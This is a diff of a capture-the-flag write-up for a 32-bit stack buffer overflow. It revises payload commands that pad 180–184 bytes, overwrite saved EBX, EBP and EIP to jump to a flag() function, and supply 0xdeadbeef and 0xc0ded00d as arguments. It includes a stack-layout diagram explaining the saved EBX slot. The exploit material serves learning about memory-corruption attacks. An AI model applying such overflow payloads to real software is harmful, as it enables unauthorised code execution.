@@ -142,7 +142,7 @@ We should write 184 dummy bytes then 0x080491e2 to the `local_bc`
 
 Build up our attack script: 
 ```s
-python3 -c "print('A'*184 + '\xe2\x91\x04\x08')" | ./vuln
+echo -ne $(python3 -c "print('A'*184 + '\xe2\x91\x04\x08')") | ./vuln
 ```
 
 flag(int param_1, int param_2):
@@ -209,15 +209,30 @@ top of                                                  bottom of
 stack                                                   stack
 ```
 
+Later on I found that the Unknown 4 bytes stack is for EBX push action:
+
+![alt text](docs/ebx.png)
+
+
+
+```s
+bottom of                                               top of
+memory                                                  memory
+            local_bc       EBX       EBP        EIP
+<------   [ 180 bytes ] [4 bytes] [4 bytes] [ 4 bytes ]
+top of                                                  bottom of
+stack                                                   stack
+```
+
 Then we have to modify the script to take it down: 
 
 ```s
 {
 echo -ne $(python3 -c "print('A'*(180), end='')")   
-echo -ne 'BBBB' # unknown
+echo -ne 'BBBB' # EBX register
 echo -ne 'CCCC' # EBP
-echo -ne '\xe2\x91\x04\x08'  #EIP
-echo -ne 'DDDD' # Dummy
+echo -ne '\xe2\x91\x04\x08'  #EIP - Overwrite with the return address of flag()
+echo -ne 'DDDD' # Dummy EIP Return address after flag() function is called
 echo -ne '\xef\xbe\xad\xde' # deadbeef
 echo -ne '\x0d\xd0\xde\xc0' # c0ded00d
 }
